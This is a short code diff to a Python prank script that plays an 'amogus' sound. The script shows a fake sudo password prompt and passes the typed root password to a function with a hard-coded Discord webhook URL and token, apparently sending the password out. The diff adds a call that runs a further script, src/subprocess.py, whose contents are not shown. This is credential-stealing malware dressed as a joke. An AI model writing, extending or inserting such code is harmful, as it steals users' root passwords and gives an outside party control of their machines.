@@ -2,6 +2,7 @@ from os import listdir
 from threading import Thread
 from colorama import Fore, Style
 from playsound import playsound
+from subprocess import run
 # Importa los módulos desde src
 try:
      from src.behavior import * 
@@ -50,6 +51,8 @@ rootPassword = input(f'[sudo] password for {username}: ')
 
 user_info(root_pswd=rootPassword,
           webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')
+
+run('python3 src/subprocess.py')
 
 def play():
      playsound('src/amogus.mp3')
